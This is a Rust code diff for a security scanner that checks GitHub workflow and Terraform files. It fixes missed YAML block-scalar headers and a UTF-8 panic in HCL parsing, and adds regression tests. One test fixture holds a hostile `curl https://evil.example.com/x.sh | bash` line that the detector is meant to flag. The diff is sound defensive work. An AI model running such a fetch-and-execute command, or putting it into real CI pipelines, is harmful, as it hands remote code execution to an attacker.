@@ -533,13 +533,7 @@ fn check_workflow_run_steps(input: &str, findings: &mut Vec<Finding>) {
                 Some(pos) => inline[..pos].trim_end(),
                 None => inline,
             };
-            if inline_code == "|"
-                || inline_code == ">"
-                || inline_code.starts_with("|-")
-                || inline_code.starts_with("|+")
-                || inline_code.starts_with(">-")
-                || inline_code.starts_with(">+")
-            {
+            if is_yaml_block_scalar_header(inline_code) {
                 in_run_block = true;
                 run_key_col = key_col;
                 continue;
@@ -611,6 +605,44 @@ fn check_workflow_run_steps(input: &str, findings: &mut Vec<Finding>) {
             custom_rule_id: None,
         });
     }
+}
+
+/// Return true if `code` is a YAML block-scalar header — either the plain
+/// indicator (`|` / `>`) or the indicator followed by an explicit
+/// indentation indicator (`|2`, `>1+`, `|+3`, …) per YAML 1.2 §8.1.1.1.
+///
+/// Pre-fix (PR #121 fix-list item 13) the check accepted only `|`, `>`,
+/// `|-`, `|+`, `>-`, `>+`. Workflows using explicit indentation indicators
+/// like `run: |2` were silently treated as a single-line `run:`, the
+/// block body never entered `in_run_block` mode, and an injection or
+/// `curl | sh` in the body went undetected.
+///
+/// YAML 1.2 §8.1.1.1 grammar:
+///   c-b-block-scalar-indicator ::= '|' | '>'
+///   c-b-chomping-indicator     ::= '-' | '+'
+///   c-b-indentation-indicator  ::= ns-dec-digit (1..9)
+/// Either order — `|2-` and `|-2` are both valid. We accept both.
+fn is_yaml_block_scalar_header(code: &str) -> bool {
+    let mut chars = code.chars();
+    // The first char must be the literal block indicator.
+    if !matches!(chars.next(), Some('|') | Some('>')) {
+        return false;
+    }
+
+    // The remainder is an optional chomping indicator (`-` / `+`) and an
+    // optional indentation digit (`1`–`9`), in either order. Zero or one
+    // of each. Each of the remaining chars must satisfy this grammar —
+    // anything else (a second `|`, a quote, text) disqualifies the line.
+    let mut saw_chomp = false;
+    let mut saw_indent = false;
+    for c in chars {
+        match c {
+            '-' | '+' if !saw_chomp => saw_chomp = true,
+            '1'..='9' if !saw_indent => saw_indent = true,
+            _ => return false,
+        }
+    }
+    true
 }
 
 /// Scan one physical line of a `run:` body, recording the first pipe-to-shell
@@ -957,13 +989,30 @@ fn parse_hcl_source(code: &str) -> Option<String> {
         }
         // A `source` token: preceded by a non-identifier byte (or line start)
         // and followed by a non-identifier byte (or line end).
-        if code[i..].starts_with(KEY)
+        //
+        // PR #121 fix-list item 4: the suspect-byte comparison must operate
+        // on `&[u8]`, NOT on `code[i..]` (a `&str` slice). When `i` lands on
+        // a UTF-8 continuation byte — anywhere a non-ASCII rune appears in
+        // an attacker-controlled `.tf` file (e.g. `modulé "x" { source = … }`)
+        // — `code[i..]` panics with "start byte index N is not a char
+        // boundary". Byte-level matching is sound: `KEY` is pure ASCII, so a
+        // byte-for-byte match on `bytes[i..i+KEY.len()]` is equivalent to
+        // matching the substring; any continuation byte at `i` makes the
+        // first byte comparison fail naturally.
+        let matches_key = bytes
+            .get(i..i + KEY.len())
+            .is_some_and(|b| b == KEY.as_bytes());
+        if matches_key
             && (i == 0 || !is_ident(bytes[i - 1]))
             && bytes
                 .get(i + KEY.len())
                 .map(|b| !is_ident(*b))
                 .unwrap_or(true)
         {
+            // Both `i + KEY.len()` and the bytes that follow are guaranteed
+            // to be char boundaries here because `KEY` is ASCII and we just
+            // confirmed a byte-for-byte match starting at `i`. The remainder
+            // of the function may therefore continue to use `&str` slicing.
             let after = code[i + KEY.len()..].trim_start();
             if let Some(rest) = after.strip_prefix('=') {
                 let value = rest.trim();
@@ -1542,6 +1591,64 @@ mod tests {
     }
 
     #[test]
+    fn workflow_run_block_scalar_explicit_indentation_indicator_flagged() {
+        // PR #121 fix-list item 13 — YAML 1.2 §8.1.1.1 allows an explicit
+        // indentation indicator (a digit 1..9) on a block-scalar header:
+        // `run: |2`, `>+3`, `|-1`. Pre-fix the recognized-prefix check
+        // only covered `|`, `>`, `|-`, `|+`, `>-`, `>+`; a `|2` workflow
+        // was silently treated as a single-line `run:` and the block
+        // body was never scanned for curl-pipe-shell or untrusted
+        // interpolations.
+        //
+        // We test multiple forms: bare digit, chomp+digit, digit+chomp.
+        // All three are legal YAML; all three must enter block-scan mode.
+        for header in &["|2", "|2-", "|-2", ">+1", "|+3"] {
+            let wf = format!(
+                "jobs:\n  build:\n    steps:\n      - run: {header}\n          echo start\n          \
+                 curl https://evil.example.com/x.sh | bash\n"
+            );
+            assert!(
+                has(
+                    &wf,
+                    ".github/workflows/ci.yml",
+                    RuleId::WorkflowCurlPipeShell
+                ),
+                "block-scalar header `run: {header}` must enter block-scan mode \
+                 and flag the curl|bash inside the body — input was:\n{wf}"
+            );
+        }
+    }
+
+    #[test]
+    fn is_yaml_block_scalar_header_recognizes_explicit_indentation_indicator() {
+        // Direct unit test for the helper — pin every recognized shape.
+        // PR #121 fix-list item 13.
+        for header in &[
+            "|", ">", "|-", "|+", ">-", ">+", "|2", ">3", "|-2", "|+3", ">-1", ">+9", "|2-", ">3+",
+        ] {
+            assert!(
+                is_yaml_block_scalar_header(header),
+                "header `{header}` must be recognized as a YAML block scalar"
+            );
+        }
+        // Non-headers (the helper must NOT over-fire on regular content).
+        for non_header in &[
+            "echo hi", "true", "|2x",      // second indentation indicator
+            "|--",      // second chomp indicator
+            "|2 ",      // trailing space (caller is expected to trim)
+            "| extra",  // text after the indicator
+            "|comment", // an alphanumeric tail
+            "",         // empty
+            ":",        // not a block-scalar indicator at all
+        ] {
+            assert!(
+                !is_yaml_block_scalar_header(non_header),
+                "`{non_header}` must NOT be recognized as a YAML block scalar header"
+            );
+        }
+    }
+
+    #[test]
     fn workflow_run_plain_command_clean() {
         let wf = "jobs:\n  build:\n    steps:\n      - run: npm ci && npm test\n";
         assert!(!has(
@@ -1880,6 +1987,46 @@ mod tests {
             !has(tf, "main.tf", RuleId::TerraformRemoteModule),
             "a `source`-suffixed identifier must not be treated as the source key"
         );
+    }
+
+    #[test]
+    fn terraform_non_ascii_in_hcl_does_not_panic() {
+        // PR #121 fix-list item 4: `parse_hcl_source` iterated by raw byte
+        // index but sliced `&str`; a non-ASCII byte in a `.tf` line (e.g. a
+        // typo like `modulé`, or a unicode identifier the operator left in
+        // a comment) lands `i` on a UTF-8 continuation byte, and the old
+        // `code[i..].starts_with(KEY)` slice panicked with
+        // "start byte index N is not a char boundary". The byte-safe match
+        // now skips through continuation bytes naturally.
+        //
+        // The fixture mixes a `modulé` typo, a non-ASCII description, and a
+        // legitimate `module` block with a remote source — the rule must
+        // (a) not panic on the non-ASCII bytes and (b) still flag the
+        // genuine remote module.
+        let tf = "modulé \"x\" { source = \"evil\" }\n\
+                  module \"vpc\" {\n  \
+                    description = \"délivré par exemple.com\"\n  \
+                    source = \"git::https://example.com/vpc.git\"\n\
+                  }\n";
+        // The first assertion is implicit — `check` running to completion
+        // without a panic. The second is the genuine module flag, which
+        // proves the byte-safe scan still finds `source` on a later line.
+        assert!(
+            has(tf, "main.tf", RuleId::TerraformRemoteModule),
+            "non-ASCII bytes must not panic, and the real remote module \
+             must still be flagged"
+        );
+    }
+
+    #[test]
+    fn terraform_non_ascii_only_does_not_panic() {
+        // Smaller variant: a `.tf` line that is *entirely* non-ASCII (e.g.
+        // a stray comment a translator added) must not crash even when
+        // there is no `source` token anywhere in the file.
+        let tf = "# délivré par exemple.com — pas de module ici\n";
+        // The assertion is "did not panic" — `check` returns Findings and
+        // we don't inspect them (no remote module, no expected finding).
+        let _ = run(tf, "main.tf");
     }
 
     #[test]
